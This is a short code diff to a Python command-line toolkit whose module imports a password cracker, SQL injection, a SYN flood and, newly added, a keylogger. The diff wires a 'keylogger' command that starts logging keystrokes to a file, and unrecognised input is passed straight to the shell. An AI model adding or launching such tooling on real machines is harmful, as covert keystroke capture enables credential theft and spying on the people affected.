@@ -4,7 +4,7 @@ from os import getcwd
 import getargs
 from os import system
 from api import CLib, Git, Installer
-from kit import http_headers, password_cracker, sql_inject, floodSYN
+from kit import http_headers, password_cracker, sql_inject, floodSYN, keylogger
 import platform
 
 
@@ -62,6 +62,11 @@ def repl() -> int:
                     print(f"Package {args[1]} does not exist or has no dependencies")
             else:
                 print(f"No package found with name {args[0]}")
+        elif cmd == "keylogger":
+            kl = keylogger.Keylogger(
+                interval=keylogger.SEND_REPORT_EVERY, report_method="file"
+            )
+            kl.start()
         else:
             system(prompt_input)
 
